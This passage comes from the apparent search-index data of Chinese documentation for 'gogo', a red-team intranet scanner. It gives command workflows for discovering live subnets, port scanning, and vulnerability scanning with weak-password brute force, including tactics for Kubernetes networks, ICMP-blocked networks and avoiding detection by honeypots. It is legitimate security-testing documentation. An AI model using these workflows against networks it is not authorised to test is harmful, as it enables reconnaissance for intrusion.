ss</code>\u5c31\u65e0\u6cd5\u53d1\u6325\u4f5c\u7528.</p> <p>\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u5230\u4e0b\u4e00\u9636\u6bb5.</p>"},{"location":"gogo/do/#\u7b2c\u4e09\u6b65-\u5bf9c\u6bb5\u8fdb\u884c\u6d4b\u7ed8","title":"\u7b2c\u4e09\u6b65, \u5bf9c\u6bb5\u8fdb\u884c\u6d4b\u7ed8","text":"<p>\u8fd9\u91ccgogo\u5df2\u7ecf\u6839\u636e\u4e0d\u540c\u573a\u666f\u505a\u4e86\u4e0d\u5c11\u4f18\u5316. \u4e0d\u8bba\u662f172, 10\u8fd8\u662f192\u90fd\u80fd\u627e\u5230\u5bf9\u5e94\u7684workflow, \u5982\u679c\u662f\u4e00\u4e9b\u7279\u6b8a\u7f51\u6bb5, \u4e5f\u53ef\u4ee5\u81ea\u884c\u6307\u5b9a.</p> <p>\u5982\u679c\u5df2\u7ecf\u8fdb\u884c\u4e86\u7b2c\u4e8c\u6b65, \u53ef\u4ee5\u5728\u7b2c\u4e8c\u6b65\u7684\u57fa\u7840\u4e0a\u7ee7\u7eed.</p> <p><code>gogo -j bcidr.dat -m s --no --af</code></p> <p>\u5982\u679c\u9700\u8981\u5408\u5e762,3\u4e24\u6b65\u5219\u66f4\u4e3a\u7b80\u5355. </p> <p><code>gogo -w 10c</code> \u63a2\u6d4b10\u6bb5\u5185\u5b58\u6d3b\u7684c\u6bb5</p> <p>\u6216\u8005\u7c7b\u4f3c\u7684<code>gogo -w 172c</code> or <code>gogo -w 192c</code></p> <p>\u5982\u679c\u662f\u81ea\u5b9a\u4e49\u7f51\u6bb5, \u53ef\u4ee5\u4f7f\u7528 <code>gogo -w sc -i 111.1.1.1/8</code></p> <p>\u6240\u6709\u7684workflow\u90fd\u81ea\u52a8\u5f00\u542f\u4e86<code>--af</code>, \u4f1a\u81ea\u52a8\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u76ee\u5f55\u4e0b\u751f\u6210bcidr\u4e0eccidr\u4e24\u4e2a\u6587\u4ef6, \u5206\u522b\u4e3a\u5b58\u6d3b\u7684B\u6bb5\u4e0eC\u6bb5.</p>"},{"location":"gogo/do/#\u7b2c\u56db\u6b65-\u5bf9\u7aef\u53e3\u8fdb\u884c\u626b\u63cf","title":"\u7b2c\u56db\u6b65, \u5bf9\u7aef\u53e3\u8fdb\u884c\u626b\u63cf","text":"<p>\u62ff\u5230\u5b58\u6d3b\u7f51\u6bb5\u4fe1\u606f, \u53ef\u4ee5\u6839\u636e\u7ecf\u9a8c\u9009\u62e9\u4e00\u4e9b\u9ad8\u4ef7\u503c\u7684\u76ee\u6807\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u4e86. </p> <p>\u4f7f\u7528\u4e0a\u4e00\u6b65\u53d1\u73b0\u7684\u5b58\u6d3bC\u6bb5\u8fdb\u884c\u7aef\u53e3\u626b\u63cf, \u5185\u7f51\u5982\u679c\u6ca1\u6709\u7981ICMP\u534f\u8bae, \u53ef\u4ee5\u4f7f\u7528--ping\u53c2\u6570\u52a0\u901f\u626b\u63cf, \u53ea\u5bf9\u5b58\u6d3b\u7684ip\u8fdb\u884c\u7aef\u53e3\u626b\u63cf.</p> <p><code>gogo -j ccidr.dat -p common --ping --af</code> </p> <p>\u5f53\u7136, \u4f9d\u65e7\u63d0\u4f9b\u4e86\u5408\u5e762-4\u6b65\u7684workflow. \u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u5373\u53ef\u4ee3\u66ff2-4\u6b65\u7684\u5168\u90e8\u884c\u4e3a.</p> <p><code>gogo -w 10</code> \u9ed8\u8ba4\u5f00\u542f\u4e86--ping, \u5982\u679c\u7981\u6b62\u4e86ICMP\u534f\u8bae, \u9700\u8981\u66ff\u6362\u6210<code>gogo -w 10noping</code> .</p> <p>172\u4e0e192\u6bb5\u540c\u7406. \u5f53\u7136\u81ea\u5b9a\u4e49\u7f51\u6bb5\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u9009\u7528, </p> <p><code>gogo -w ss -i 111.1.1.1/8</code></p> <p>or</p> <p><code>gogo -w s -i 111.1.1.1/16</code></p> <p>\u5982\u679c\u7f51\u6bb5\u5c0f\u4e8e16\u5219\u5efa\u8bae\u4f7f\u7528<code>-w ss</code> ,\u5982\u679c\u5927\u4e8e\u7b49\u4e8e16\u5219\u5efa\u8bae\u4f7f\u7528<code>-w s</code>.</p> <p>\u7b49\u5f85\u626b\u63cf\u5b8c\u6210\u540e, \u4f1a\u53d1\u73b0\u76ee\u5f55\u4e0b\u5b58\u5728 <code>...json.dat</code>\u7684\u6587\u4ef6. </p> <p>\u8bf7\u52a1\u5fc5\u5c06\u5176\u4fdd\u5b58\u5230\u672c\u5730, \u4ee5\u4fbf\u540e\u7eed\u5904\u7406\u4ee5\u53ca\u9632\u6b62shell\u4e22\u5931\u626b\u63cf\u8bb0\u5f55.</p> <p>\u4f7f\u7528<code>gogo -F json.dat</code> \u683c\u5f0f\u5316\u626b\u63cf\u7ed3\u679c. </p> <p>\u5bf9\u4e8e\u6709\u7ecf\u9a8c\u7684\u7ea2\u961f, \u5230\u8fd9\u4e00\u6b65\u57fa\u672c\u5c31\u8db3\u591f\u4e86, \u540e\u7eed\u5c31\u662f\u9009\u62e9\u96c6\u6743\u670d\u52a1\u5668\u6216\u8005\u5411\u7740\u57df\u53d1\u8d77\u51b2\u950b.</p>"},{"location":"gogo/do/#\u7b2c\u4e94\u6b65-\u5bf9\u8d44\u4ea7\u8fdb\u884c\u6df1\u5165\u63a2\u6d4b","title":"\u7b2c\u4e94\u6b65, \u5bf9\u8d44\u4ea7\u8fdb\u884c\u6df1\u5165\u63a2\u6d4b","text":"<p>\u4f46\u5bf9\u4e8ehw\u8fd9\u79cd\u9700\u8981\u5237\u5206\u7684\u573a\u666f, \u53ef\u4ee5\u5c31\u9700\u8981\u5bf9\u5185\u7f51\u8fdb\u884c\u4e00\u4e2a\u6279\u91cf\u7684\u6f0f\u6d1e\u626b\u63cf\u4e0e\u5f31\u53e3\u4ee4/\u9ed8\u8ba4\u53e3\u4ee4\u7206\u7834.</p> <p>\u5bf9\u4e8egogo\u6765\u8bf4\u5c31\u662f<code>-e</code> (\u6f0f\u6d1e\u626b\u63cf)\u4e0e<code>-v</code>(\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b)</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f, \u5982\u679c\u4f7f\u7528-ev\u626b\u5230\u4e86\u871c\u7f50, \u4e0d\u8bba\u9632\u5b88\u65b9\u53cd\u5e94\u591a\u6162, \u4e5f\u80fd\u610f\u8bc6\u5230\u5185\u7f51\u6709\u4e0d\u901f\u4e4b\u5ba2\u4e86.  \u6240\u4ee5\u4f7f\u7528-ev\u9700\u8981\u8c28\u614e.</p> <p>\u4f7f\u7528\u7b2c\u56db\u6b65\u7684\u626b\u63cf\u7ed3\u679c\u8fdb\u884c\u5f00\u542f\u4e86\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u4e0e\u6f0f\u6d1e\u626b\u63cf\u7684\u518d\u6b21\u626b\u63cf. </p> <p><code>gogo -j json.dat -ev --af -t 200</code> </p> <p>\u6ce8\u610f</p> <p>\u56e0\u4e3a\u8fd9\u6b21\u626b\u63cf\u7684\u6240\u6709\u76ee\u6807\u90fd\u662f\u5b58\u6d3b\u7684, \u6240\u4ee5\u5efa\u8bae\u8c03\u4f4e\u7ebf\u7a0b\u6570, \u9632\u6b62\u8fc7\u5927\u7684\u6d41\u91cf\u963b\u585e\u7f51\u7edc.</p> <p>\u540c\u6837\u7684, \u4e5f\u5b58\u5728\u4e00\u4e2a\u4e00\u884c\u5c31\u80fd\u89e3\u51b32-5\u6b65\u7684\u89e3\u51b3\u65b9\u6848.</p> <p><code>gogo -w 10 -ev</code> 172, 192\u4ee5\u53ca\u81ea\u5b9a\u4e49\u7f51\u6bb5\u540c\u7406. </p> <p>\u8fd9\u4e00\u884c\u547d\u4ee4\u66f4\u50cf\u662fgithub\u4e0a\u7684\u540c\u7c7b\u5de5\u5177, \u7b80\u5355\u4e14\u7c97\u66b4. \u4f7f\u7528\u9700\u8c28\u614e!</p> <p>gogo\u7684poc\u5df2\u7ecf\u5220\u9664\u4e86\u6240\u6709\u7684\u653b\u51fb\u6027, \u5e76\u4e14\u5bf9\u5355\u4e2a\u7aef\u53e3\u540c\u65f6\u53ea\u7528\u4e00\u4e2atcp\u94fe\u63a5, \u56e0\u6b64\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u53d1\u751f\u5bf9\u88ab\u626b\u63cf\u76ee\u6807\u9020\u6210\u4f24\u5bb3. \u4f46\u5b9e\u6218\u4e2d\u590d\u6742\u7684\u573a\u666f\u4f9d\u65e7\u4e0d\u6392\u9664\u9020\u6210\u6076\u52a3\u540e\u679c\u7684\u60c5\u51b5. \u8bf7\u4f7f\u7528\u8005\u8bf7\u4e00\u5b9a\u8981\u8c28\u614e\u4f7f\u7528. </p> <p>\u5f53\u7136\u5bf9\u4e8e\u8f83\u9ad8\u9632\u62a4\u80fd\u529b\u7684\u76ee\u6807, \u6267\u884c\u5b8c\u8fd9\u4e00\u6b65\u4e5f\u610f\u5473\u7740\u653b\u51fb\u8005\u7684\u66b4\u9732, \u53ef\u4ee5\u6839\u636egogo\u7684\u7279\u5f81\u8fdb\u884c\u5feb\u901f\u6eaf\u6e90\u53cd\u5236.</p>"},{"location":"gogo/do/#\u573a\u666f2-\u5404\u79cd\u573a\u666f\u4e0b\u7684\u542f\u53d1\u5f0f\u626b\u63cf\u6700\u4f73\u5b9e\u8df5","title":"\u573a\u666f2 \u5404\u79cd\u573a\u666f\u4e0b\u7684\u542f\u53d1\u5f0f\u626b\u63cf\u6700\u4f73\u5b9e\u8df5","text":"<p>\u7ed3\u5408\u5728\u542f\u53d1\u5f0f\u626b\u63cf\u539f\u7406\u4e2d\u63d0\u5230\u7684\u5404\u79cd\u7ec6\u8282, \u53ef\u4ee5\u603b\u7ed3\u51fa\u5404\u79cd\u573a\u666f\u4e0b\u7684\u6700\u4f73\u5b9e\u73b0.</p> <p>\u4e3a\u4e86\u80fd\u591f\u81ea\u7531\u7684\u63a7\u5236\u542f\u53d1\u5f0f\u626b\u63cf, \u5f15\u5165\u4e86\u8fd110\u4e2a\u53c2\u6570, \u4ee5\u53ca3-5\u4e2a\u8f93\u51fa\u6587\u4ef6, \u4f7f\u7528\u53d8\u5f97\u590d\u6742, \u4e5f\u6709\u597d\u591a\u4eba\u4e0e\u6211\u53cd\u9988\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u53c8\u4e3a\u4e86\u7b80\u5316\u542f\u53d1\u5f0f\u626b\u63cf\u7684\u4f7f\u7528, gogo\u7ed9\u5927\u90e8\u5206\u4f7f\u7528\u573a\u666f\u6dfb\u52a0\u4e86workflow\u89e3\u51b3\u65b9\u6848, \u73b0\u5728\u5927\u90e8\u5206\u60c5\u51b5\u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u5c31\u80fd\u89e3\u51b3\u4e86\u3002</p>"},{"location":"gogo/do/#\u7f51\u6bb5\u53d1\u73b0","title":"\u7f51\u6bb5\u53d1\u73b0","text":"<ol> <li>\u4eceB\u6bb5\u4e2d\u53d1\u73b0\u5b58\u6d3b\u7684C\u6bb5(C\u6bb5\u55b7\u6d12), <code>gogo -ip 192.168.1.1/16 --mod s -no</code> or <code>gogo --workflow 192c</code></li> <li>\u4eceA\u6bb5\u4e2d\u53d1\u73b0\u5b58\u6d3b\u7684B\u6bb5(B\u6bb5\u55b7\u6d12), <code>gogo -ip 10.1.1.1/8 --mod ss -no</code> or <code>gogo --workflow 10b</code></li> <li>\u4eceA\u6bb5\u4e2d\u53d1\u73b0\u5b58\u6d3b\u7684C\u6bb5(A\u6bb5\u7684\u542f\u53d1\u5f0fC\u6bb5\u55b7\u6d12), <code>gogo -ip 10.1.1.1/8 --mod sc</code> or <code>gogo --workflow 10c</code></li> <li>\u81ea\u5b9a\u4e49B\u6bb5\u7684C\u6bb5\u55b7\u6d12, <code>gogo -l b.txt --mod s -no</code> or <code>gogo --workflow c -l b.txt</code></li> <li>\u81ea\u5b9a\u4e49A\u6bb5\u7684B\u6bb5\u55b7\u6d12, <code>gogo -l a.txt --mod ss -no</code> or <code>gogo --workflow b -l a.txt</code></li> </ol>"},{"location":"gogo/do/#\u5b58\u6d3bip\u53d1\u73b0","title":"\u5b58\u6d3bIP\u53d1\u73b0","text":"<ol> <li>\u4f7f\u7528ICMP\u534f\u8bae\u53d1\u73b0A\u6bb5\u4e2d\u6240\u6709\u5b58\u6d3b\u7684IP,   <code>gogo -ip 10.1.1.1/8 --mod ss -p icmp</code> or <code>gogo --workflow 10ip</code>(\u5355\u7aef\u53e3\u7684<code>--m ss</code>\u626b\u63cf\u505a\u4e86\u7279\u6b8a\u7684\u4f18\u5316, \u5177\u4f53\u89c1: </li> </ol> <p>A\u6bb5\u7684\u542f\u53d1\u5f0f\u626b\u63cf \u5728<code>-p</code>\u53ea\u6307\u5b9a\u4e861~2\u4e2a\u7aef\u53e3\u7684\u65f6\u5019, \u4e0d\u8fdb\u884cC\u6bb5\u55b7\u6d12, \u76f4\u63a5\u8fdb\u884c\u7aef\u53e3\u626b\u63cf( C\u6bb5\u55b7\u6d12\u7ea6\u7b49\u4e8e\u8fdb\u884c\u4e00\u6b21\u5355\u7aef\u53e3\u5168\u626b\u63cf)</p> <ol> <li>\u4f7f\u7528ICMP\u53d1\u73b0B\u6bb5\u4e2d\u7684\u6240\u6709\u5b58\u6d3b\u7684IP,  <code>gogo -ip 192.168.1.1/16 --mod s -p icmp</code> or <code>gogo --workflow 192ip</code></li> </ol>"},{"location":"gogo/do/#\u7aef\u53e3\u626b\u63cf","title":"\u7aef\u53e3\u626b\u63cf","text":"<ol> <li>\u4f7f\u7528ICMP\u534f\u8bae\u53d1\u73b0A\u6bb5\u4e2d\u6240\u6709\u7684\u6570\u636e\u5e93, <code>gogo -ip 10.1.1.1/8 --mod ss  -p db</code> or <code>gogo --workflow 10 -p db</code> \u7981\u6b62ping\u5185\u7f51\u9700\u8981\u4f7f\u7528 <code>gogo --workflow 10noping -p db</code></li> <li>\u4f7f\u752880\u7aef\u53e3\u63a2\u6d4bA\u6bb5\u4e2d\u6240\u6709\u7684\u6570\u636e\u5e93, <code>gogo -ip 10.1.1.1/8 --mod ss  -sp 80 -p db</code> <code>gogo --workflow 10 -sp 80 -p db</code></li> <li>\u542f\u53d1\u5f0f\u626b\u63cfB\u6bb5\u5e38\u89c1\u7aef\u53e3\u8d44\u4ea7, <code>gogo -ip 192.168.1.1/16 --mod s -p win,top2,db</code> or <code>gogo --workflow 192</code></li> <li>\u542f\u53d1\u5f0f\u626b\u63cfC\u6bb5\u5e38\u89c1\u7aef\u53e3\u8d44\u4ea7, <code>gogo -ip 10.1.1.1/8 --mod ss -p win,top2,db</code> or <code>gogo --workflow 10</code></li> <li>\u5185\u7f51\u4e00\u628a\u68ad(\u614e\u7528), \u81ea\u52a8\u5316\u63a2\u6d4b172,192,10\u7b49\u5e38\u89c1\u5185\u7f51\u7f51\u6bb5,   <code>gogo --workflow interc</code></li> </ol>"},{"location":"gogo/do/#\u4e00\u4e9b\u7279\u6b8a\u60c5\u51b5\u7684\u4f7f\u7528\u573a\u666f","title":"\u4e00\u4e9b\u7279\u6b8a\u60c5\u51b5\u7684\u4f7f\u7528\u573a\u666f","text":"<ol> <li>\u5047\u8bbe80\u7aef\u53e3\u5b58\u5728ACL\u7684C\u6bb5\u55b7\u6d12, <code>gogo -ip 10.1.1.1/8 --mod s -sp 22,445,icmp -no</code> or <code>gogo --workflow 10c -sp 22,445,icmp</code></li> <li>\u5047\u8bbe\u7f51\u5173ip\u4e3a1,253,254\u7684B\u6bb5\u55b7\u6d12 ,<code>gogo -ip 10.1.1.1/8 --mod ss -ipp 1,253-254 -no</code> or <code>gogo --workflow 10b -ipp 1,253-254</code></li> <li>\u5047\u8bbe\u7981ping\u60c5\u51b5\u4e0b, \u7f51\u5173ip\u4e3a1,253,254\u7684B\u6bb5\u55b7\u6d12, <code>gogo -ip 10.1.1.1/8 --mod ss -sp 80,22 -ipp 1,253-254 -no</code> or <code>gogo --workflow 10b -sp 80,22 -ipp 1,253-254</code></li> </ol>"},{"location":"gogo/do/#\u7279\u6b8a\u573a\u666f","title":"\u7279\u6b8a\u573a\u666f","text":""},{"location":"gogo/do/#\u573a\u666f1-k8singressistio","title":"\u573a\u666f1 k8s/ingress/Istio","text":"<p>\u5728\u8fd9\u4e2a\u573a\u666f\u4e2d, \u8d44\u4ea7\u5206\u5e03\u4e0e\u5e38\u89c1\u7684\u5185\u7f51\u6709\u5f88\u5927\u4e0d\u540c.  \u6b63\u5e38\u7684\u5185\u7f51\u4e2d, \u7f51\u6bb5\u89c4\u5212\u4e0eip\u662f\u901a\u8fc7\u7ba1\u7406\u5458\u624b\u52a8\u914d\u7f6e\u540e\u518d\u4ea4\u7531DHCP\u670d\u52a1\u6216\u8005static ip\u5206\u914d.  \u56e0\u6b64\u7f51\u6bb5\u662f\u975e\u5e38\u6709\u89c4\u5f8b\u7684, \u8fd9\u79cd\u89c4\u5f8b\u88absmart\u6a21\u5f0f\u4e0esupersmart\u5b8c\u5168\u6982\u62ec, supersmart\u662f\u8fd9\u79cd\u6a21\u5f0f\u4e0b\u5bf9A\u6bb5\u5927\u5185\u7f51\u63a2\u6d4b\u7684\u7406\u8bba\u6700\u4f18\u89e3. \u4f46\u5bf9\u4e8e\u4e91\u539f\u751f\u7684\u73af\u5883\u4e2d, ip\u7684\u5206\u914d\u662f\u968f\u673a\u7684, \u518d\u7531\u670d\u52a1\u53d1\u73b0\u4e0e\u5747\u8861\u8d1f\u8f7d\u63a7\u5236\u5668\u8fdb\u884c\u6d41\u91cf\u5206\u914d. \u4e00\u822c\u60c5\u51b5\u4e0b, \u901a\u8fc7<code>env</code>\u547d\u4ee4\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u4e3a\u8fd9\u79cd\u7c7b\u578b\u7684\u5185\u7f51. \u8fd9\u79cd\u7c7b\u578b\u7684\u5185\u7f51\u4e2d\u4f1a\u5b58\u5728\u5927\u91cf<code>service_name=ip:port</code>\u7684\u914d\u7f6e, \u5e76\u4e14ip\u4e3a\u968f\u673a\u751f\u6210\u7684ip.</p> <p>\u56e0\u6b64\u8fd9\u79cd\u573a\u666f\u4e0b, \u4e0d\u7ba1\u662f\u626bC\u6bb5\u8fd8\u662fsupersmart\u8fd8\u662f\u624b\u52a8\u63a2\u6d4b\u90fd\u4f1a\u6709\u4e9b\u4e0d\u9002\u5e94. </p> <p>k8s\u9ed8\u8ba4\u7684\u7f51\u6bb5\u662f10.0.0.0/8, \u5404\u79cd\u670d\u52a1\u968f\u673a\u7684\u5206\u5e03\u5728\u8fd9\u6574\u4e2a\u5927\u7f51\u7edc, \u6ca1\u6709\u7f51\u5173, \u4e5f\u6ca1\u6709\u96c6\u4e2d\u5b58\u6d3b\u7684\u7f51\u6bb5. \u5982\u679c\u4f7f\u7528fscan\u4e4b\u7c7b\u7684\u5de5\u5177\u5bf9\u8fd9\u4e2a\u7f51\u6bb5\u8fdb\u884c\u63a2\u6d4b, \u56e0\u4e3a\u53ea\u80fd\u4f7f\u7528ping\u53bb\u63a2\u6d4b\u5b58\u6d3b\u7f51\u5173\u7684\u539f\u56e0, \u5c06\u4e0d\u4f1a\u5f97\u5230\u4efb\u4f55\u7ed3\u679c. </p> <p>\u5e76\u4e14, \u5982\u679c\u4e0d\u4f7f\u7528ping\u7f51\u5173\u7684\u65b9\u5f0f\u53bb\u63a2\u6d4b, \u5bf9\u6574\u4e2a10\u6bb5\u8fdb\u884cping\u63a2\u6d4b, \u4e5f\u4e0d\u4e00\u5b9a\u80fd\u5f97\u5230\u5168\u90e8\u7ed3\u679c. \u56e0\u4e3ak8s\u4e2d\u7684\u4e0d\u540cservice\u4e4b\u95f4\u5e76\u4e0d\u4e00\u5b9a\u80fdping\u901a, \u53ea\u6709\u540c\u5c5e\u4e8e\u4e00\u4e2anameserver\u4e0b\u624d\u80fd\u76f4\u63a5ping\u901a. \u4f46ping\u4e0d\u901a\u7684\u76ee\u6807\u4f9d\u7136\u6709\u53ef\u80fd\u8bbf\u95ee, \u901a\u8fc7k8s\u5185\u90e8\u7684\u57df\u540d, \u4f9d\u65e7\u6709\u53ef\u80fd\u8bbf\u95ee\u5230\u5176\u4ed6\u8d44\u4ea7. </p> <p>\u7efc\u4e0a\u6240\u8ff0, \u8fd9\u4e2a\u73af\u5883\u4e0b, \u6700\u597d\u7684\u626b\u63cf\u7b56\u7565\u662f\u5bf9\u5168ip\u8fdb\u884c\u5e38\u89c1\u7aef\u53e3\u63a2\u6d4b. </p> <p>\u4f8b\u5982</p> <p><code>gogo -i 10.0.0.0/8 -w s --sp 80,22,icmp</code> </p> <p>\u8fd9\u79cd\u65b9\u5f0f\u80fd\u83b7\u5f97\u5927\u90e8\u5206\u7ed3\u679c. \u4f46\u5982\u679c\u914d\u7f6e\u4e86\u7981\u6b62ping\u7b56\u7565, \u5e7680\u4e0e22\u7aef\u53e3\u4e0d\u5f00\u653e, \u90a3\u4e48\u4f9d\u65e7\u6709\u53ef\u80fd\u6f0f\u6389\u5f88\u591a\u8d44\u4ea7.  \u76ee\u524d\u6ca1\u6709\u529e\u6cd5\u89e3\u51b3, \u4f46\u53ef\u4ee5\u914d\u5408\u624b\u52a8\u4fe1\u606f\u6536\u96c6\u8fdb\u884c\u7279\u5b9a\u7b56\u7565\u7684\u626b\u63cf.</p> <p>\u6ce8\u610f.</p> <p>\u4e0d\u80fd\u4f7f\u7528-m ss\u6216\u8005-w 10\u7b49\u65b9\u5f0f, \u56e0\u4e3a\u8fd9\u79cd\u7f51\u7edc\u67b6\u6784\u4e2d\u6ca1\u6709\u7f51\u5173\u7684\u6982\u5ff5, \u57fa\u4e8e\u7f51\u5173\u7684\u63a2\u6d4b\u65b9\u5f0f\u5747\u4e0d\u80fd\u4f7f\u7528. </p> <p>\u4f8b\u5982\u5728Istio\u7684sidecar\u67b6\u6784\u6216\u8005\u67d0\u4e9b\u8fd0\u7ef4\u76d1\u63a7\u670d\u52a1\u4f1a\u76d1\u542c\u7279\u5b9a\u7aef\u53e3, \u5982zabbix\u76842000\u7aef\u53e3. \u90a3\u4e48\u53ef\u4ee5\u5c06\u5b58\u6d3b\u63a2\u9488\u6307\u5b9a\u4e3a\u8fd9\u4e2a\u7aef\u53e3\u8fdb\u884c\u63a2\u6d4b. </p> <p><code>gogo -i 10.0.0.0/8 -w s --sp 2000</code></p> <p>\u5728\u67d0\u4e9b\u7279\u6b8a\u7684\u573a\u666f\u53ef\u80fd\u8fdegogo\u90fd\u4e0d\u8d77\u4f5c\u7528\u4e86. \u5c31\u9700\u8981\u5229\u7528k8s\u5185\u90e8\u7684dns\u670d\u52a1\u5668\u8fdb\u884c\u63a2\u6d4b. \u501f\u52a9ksubdomain\u6216\u8005dnsx\u8fdb\u884cdns\u7206\u7834\u4e5f\u80fd\u83b7\u5f97\u4e00\u4e9b\u4fe1\u606f. </p>"},{"location":"gogo/do/#\u573a\u666f2-\u7981\u6b62icmp\u534f\u8bae\u7684\u5185\u7f51","title":"\u573a\u666f2 \u7981\u6b62ICMP\u534f\u8bae\u7684\u5185\u7f51","text":"<p>\u7981\u6b62ICMP\u534f\u8bae\u662f\u67d0\u4e2a\u65f6\u671f\u7ecf\u5e38\u88ab\u63d0\u8d77\u7684\u7f51\u7edc\u7b56\u7565, \u4f46\u5b9e\u9645\u4e0a\u6574\u4e2a\u5185\u7f51\u914d\u7f6e\u7981\u6b62ICMP\u7684\u573a\u666f\u5e76\u4e0d\u7b97\u591a. \u4f46\u67d0\u4e9b\u573a\u666f\u7684\u7981\u6b62ICMP\u7b56\u7565\u53cd\u800c\u4f1a\u88ab\u5e02\u9762\u4e0a\u7684\u6240\u6709\u626b\u63cf\u5668\u5ffd\u7565. </p> <p>\u6ce8\u610f.</p> <p>\u7981\u6b62ICMP\u5b9e\u9645\u4e0a\u6709\u4e24\u79cd\u60c5\u51b5. \u8def\u7531\u5668/\u9632\u706b\u5899\u4e2d\u8bbe\u7f6e\u4e86drop ICMP\u6216\u8005\u76f8\u5173\u7684\u7f51\u7edc\u914d\u7f6e\u5bfc\u81f4\u7f51\u7edc\u4e0d\u53ef\u8fbe. </p> <ol> <li> <p>\u6240\u6709ICMP\u8bf7\u6c42\u90fd\u4f1atimeout.</p> </li> <li> <p>ICMP\u534f\u8bae\u76f4\u63a5\u8fd4\u56de\u7ed3\u679c, \u901a\u5e38\u62a5\u9519\u662fdestination host unreachable\u76ee\u6807\u4e3b\u673a\u4e0d\u53ef\u8fbe.</p> </li> </ol> <p>\u8fd9\u4e24\u79cd\u54cd\u5e94\u5f88\u96be\u5177\u4f53\u533a\u5206\u662f\u4ec0\u4e48\u539f\u56e0\u5bfc\u81f4\u7684. \u4f46\u5728\u626b\u63cf\u7ed3\u679c\u4e0a\u770b\u4f1a\u5bfc\u81f4\u5b8c\u5168\u76f8\u53cd\u7684\u7ed3\u8bba.</p> <p>\u5168\u5185\u7f51\u7981\u6b62ICMP</p> <p>\u8fd9\u4e2a\u573a\u666f\u7279\u5f81\u7279\u522b\u660e\u663e, \u5927\u591a\u662f\u7f51\u7edc\u8bbe\u5907\u7684\u914d\u7f6e\u5bfc\u81f4\u7684, \u80fd\u76f4\u63a5\u611f\u53d7\u5230\u4f7f\u7528fscan\u548cgogo\u7684\u67d0\u4e9bworkflow\u626b\u63cf\u4e0d\u51fa\u4efb\u4f55\u7ed3\u679c, \u4f46\u662f\u4e00\u4e9b\u88ab\u52a8\u4fe1\u606f\u6536\u96c6\u7684\u65b9\u5f0f\u6709\u8bc1\u660e\u67d0\u4e9b\u7f51\u6bb5\u5b58\u5728\u8d44\u4ea7. \u8fd9\u79cd\u5f02\u5e38\u5927\u90e8\u5206\u4eba\u90fd\u80fd\u611f\u77e5\u5230, \u4f1a\u5feb\u901f\u4fee\u6539\u626b\u63cf\u7b56\u7565. </p> <p>fscan\u4e2d\u63d0\u4f9b\u4e86no-ping\u9009\u9879, \u76f4\u63a5\u5173\u95ed\u4e86ping\u7684\u63a2\u6d4b\u9636\u6bb5\u8fdb\u5165\u5230\u5e38\u89c1\u7aef\u53e3\u626b\u63cf, \u8fd9\u76f4\u63a5\u5bfc\u81f4\u4e86\u626b\u63cf\u65f6\u95f4\u6307\u6570\u589e\u957f, \u5bf9\u4e00\u4e2aB\u6bb5\u626b\u4e2a\u51e0\u5929\u51e0\u591c\u90fd\u662f\u5e38\u89c1\u60c5\u51b5. \u8fd9\u51e0\u4e4e\u662f\u4e0d\u53ef\u63a5\u53d7\u7684, \u66f4\u8ba9\u626b\u63cfA\u6bb5\u53d8\u6210\u4e0d\u53ef\u80fd, \u5c31\u7b97\u6709\u65e0\u9650\u7684\u65f6\u95f4, fscan\u4e5f\u4f1a\u56e0\u4e3a\u8fdf\u8fdf\u65e0\u6cd5\u89e3\u51b3\u7684\u5185\u5b58\u6cc4\u9732\u95ee\u9898\u5bfc\u81f4\u5185\u5b58\u8017\u5c3d\u62a5\u9519\u9000\u51fa. </p> <p>gogo\u4e2d\u63d0\u4f9b\u4e86\u66f4\u52a0\u4f18\u96c5\u7684\u89e3\u51b3\u65b9\u6848, \u53ea\u9700\u8981\u4fee\u6539\u542f\u53d1\u5f0f\u626b\u63cf\u63a2\u9488\u5373\u53ef. </p> <p>supersmart\u4e0b\u7f51\u5173\u5e38\u89c1\u7aef\u53e3\u4e3a <code>80,23,22</code> (\u5b9e\u9645\u4e0a\u6240\u6709ss\u76f8\u5173\u7684workflow\u5728noping\u6a21\u5f0f\u4e0b\u4f1a\u81ea\u52a8\u5c06\u7aef\u53e3\u63a2\u9488\u4fee\u6539\u4e3a80, \u4f46\u4e3a\u4e86\u9002\u914d\u7f51\u5173\u7684\u89c4\u5f8b, \u5efa\u8bae\u6dfb\u52a0\u4e0a23,22\u7aef\u53e3):</p> <p><code>gogo -i 10.0.0.0/8 -w ssnoping --sp 80,23,22</code> </p> <p>smart\u4e0b\u9ed8\u8ba4\u7684\u63a2\u9488\u7aef\u53e3\u4e3a80,\u4e0d\u9700\u8981\u4fee\u6539.  </p> <p><code>gogo -i 172.16.1.1/16 -w snoping</code> </p> <p>\u5728\u5168\u7f51\u7981\u6b62ICMP\u7684\u73af\u5883\u4e0b, gogo\u4f9d\u65e7\u80fd\u4fdd\u8bc1\u76f8\u540c\u7684\u901f\u5ea6\u5b8c\u6210\u5bf9\u6574\u4e2a\u5185\u7f51\u7684\u63a2\u6d4b. </p> <p>\u90e8\u5206IP\u7981\u6b62ICMP</p> <p>\u67d0\u4e9b\u8bbe\u5907\u6216\u8005\u955c\u50cf\u4f1a\u914d\u7f6e<code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</code> \u8fd9\u5c06\u5bfc\u81f4\u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de\u4efb\u4f55ICMP\u7684\u54cd\u5e94. \u4e5f\u6709\u53ef\u80fd\u662f\u8def\u7531\u5668/\u9632\u706b\u5899\u7684\u914d\u7f6e\u5bfc\u81f4\u67d0\u4e9b\u5b50\u7f51\u6bb5\u6216\u5355\u4e2aip\u65e0\u6cd5ping. </p> <p>\u8fd9\u79cd\u60c5\u51b5\u5982\u679c\u4f7f\u7528fscan, \u5c06\u5bfc\u81f4\u76f4\u63a5\u5ffd\u7565\u6389\u8fd9\u4e9bip/\u7f51\u6bb5, 